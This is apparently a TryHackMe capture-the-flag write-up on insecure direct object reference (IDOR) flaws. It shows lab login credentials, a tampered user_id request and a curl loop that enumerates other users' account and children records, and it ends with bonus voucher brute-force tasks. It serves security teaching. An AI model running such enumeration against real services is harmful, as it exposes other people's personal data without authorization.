```
▜▘▛▀▖▞▀▖▛▀▖     ▞▀▖      ▐         ▌  ▗▐  ▐  ▜     ▜▘▛▀▖▞▀▖▛▀▖
▐ ▌ ▌▌ ▌▙▄▘ ▄▄▖ ▚▄ ▝▀▖▛▀▖▜▀ ▝▀▖▞▀▘ ▌  ▄▜▀ ▜▀ ▐ ▞▀▖ ▐ ▌ ▌▌ ▌▙▄▘
▐ ▌ ▌▌ ▌▌▚      ▖ ▌▞▀▌▌ ▌▐ ▖▞▀▌▝▀▖ ▌  ▐▐ ▖▐ ▖▐ ▛▀  ▐ ▌ ▌▌ ▌▌▚ 
▀▘▀▀ ▝▀ ▘ ▘     ▝▀ ▝▀▘▘ ▘ ▀ ▝▀▘▀▀  ▀▀▘▀▘▀  ▀  ▘▝▀▘ ▀▘▀▀ ▝▀ ▘ ▘
```
In this THM room we learn about IDOR while helping pentest the TrypresentMe website. [^1]

What does IDOR stand for?
-----------------------------------------------------------------------------------------
An *Insecure Direct Object Reference* (IDOR) occurs when a web application exposes direct
reference to an object, like a file or a database, which the user can directly control to
obtain access to other similar, but sensitive objects. It is a type of access control
vulnerability that can be exploited when web servers don't check access rights before the
sending of data.

What type of privilege escalation are most IDOR cases?
-----------------------------------------------------------------------------------------
IDOR vulnerabilities are often enabling an attacker to use a feature they are authorized
to use without gaining access to more features per default. They are therefore an example
for *horizontal privilege escalation* in a majority of the cases but an exploitation
might reach further access rights as well.

Upon exploiting the IDOR found in the `view_accounts` parameter, what is the `user_id` of
the parent that has 10 children?
-----------------------------------------------------------------------------------------
We log in on the website of the target machine with the username `niels` and password
`TryHackMe#2025`. In the developer tools, we naviate to the network tab and refresh the
page. Here, we notice a direct object reference in the request to the `view_accountinfo`
site with the `user_id` 10. In the response message for this HTTP GET request we are
then given JSON information as follows.

```json
{
  "user_id":10,
  "username":"niels",
  "email":"niels@webmail.thm",
  "firstname":"Niels",
  "lastname":"Tester",
  "id_number":"NIELS-001",
  "address1":"42 chill Street",
  "address2":"Apt 1",
  "city":"TryTown",
  "state":"THM",
  "postal_code":"42424",
  "country":"Netherlands",
  "children":
  [
    {"child_id":2,"id_number":"8902035555","first_name":"Bilbo","last_name":"Baggins","birthdate":"2008-05-01"},
    {"child_id":3,"id_number":"152312","first_name":"johny","last_name":"doe","birthdate":"1920-10-01"},
    {"child_id":4,"id_number":"JOHNYDOE-554","first_name":"johny","last_name":"doe","birthdate":"1996-10-25"},
    {"child_id":9,"id_number":"TERSTTESTER-605","first_name":"Terst","last_name":"Tester","birthdate":"2025-10-06"},
    {"child_id":10,"id_number":"TEST2TESTER-014","first_name":"Test2","last_name":"Tester","birthdate":"2025-06-03"}
  ]
}
```
We suspect an IDOR vulnerability and change the `user_id` in the HTTP request to 11 and
send it again. And indeed, we are rewarded with the JSON information for another user
which should have not happened. For this task in particular, we want find out the user
with 10 children. So we want to enumerate over all the users and collect their children
amount. First, we copy the request value as a `cURL` command which can be done in the
network tab of the developer tools directly and execute it in our attacking machine.
Second, upon sucessful proof that this works, we enumerate over different user IDs, in
this case the first 50 and collect the length of the children array. This can be done
in a bash command like the following for illustration purposes.

```bash
for i in {1..50}; do
  curl -s "http://<TARGET_MACHINE_IP_ADDRSS>/api/parents/view_accountinfo?user_id=$i" \
    -H "Authorization: <AUTHORIZATION_REQUEST_HEADER>" \
  | jq '.children | length'
done | nl
```
The result is that the user with the ID 4 has three children, user `niels` five (as we
saw it above) and the user with the `user_id` 15 has ten children. All other users do not
have any children in the iterated list.

# TBC

Bonus Task: If you want to dive even deeper, use either the base64 or md5 child endpoint and try to find the id_number of the child born on 2019-04-17? To make the iteration faster, consider using something like Burp's Intruder. If you want to check your answer, click the hint on the question.

Bonus Task: Want to go even further? Using the /parents/vouchers/claim endpoint, find the voucher that is valid on 20 November 2025. Insider information tells you that the voucher was generated exactly on the minute somewhere between 20:00: 24:00 UTC that day. What is the voucher code? If you want to check your answer, click the hint on the question.

[^1]: https://tryhackme.com/room/idor-aoc2025-zl6MywQid9
